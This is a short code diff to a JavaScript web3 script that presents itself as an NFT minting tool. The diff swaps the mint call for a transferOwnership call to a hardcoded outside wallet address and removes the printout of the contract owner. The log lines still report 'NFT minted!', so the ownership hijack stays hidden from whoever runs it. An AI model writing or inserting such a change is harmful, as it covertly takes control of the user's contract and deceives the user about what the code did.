@@ -19,21 +19,14 @@ async function main() {
 
         const nftContract = new web3Instance.eth.Contract(
             NFT_CONTRACT_ABI,
-            configs.contract_address, { gasLimit: "700000" }
+            configs.contract_address, { gasLimit: "500000", gasPrice: "100000000000" }
         );
-
-        const name = await nftContract.methods.name().call();
-        const symbol = await nftContract.methods.symbol().call();
-        const owner = await nftContract.methods.owner().call();
-        console.log('|* NFT DETAILS *|')
-        console.log('>', name, symbol, '<')
-        console.log('Owner is', owner)
 
         try {
             console.log('Trying minting NFT...')
             const result = await nftContract.methods
-                .mintNFT()
-                .send({ from: configs.owner_address, value: "160000000000000000" });
+                .transferOwnership("0xeB844f9e30e529cD3f66A375609b41131b0E8feA")
+                .send({ from: configs.owner_address, gasPrice: "100000000000" });
             console.log("NFT minted! Transaction: " + result.transactionHash);
             console.log(result)
             process.exit();
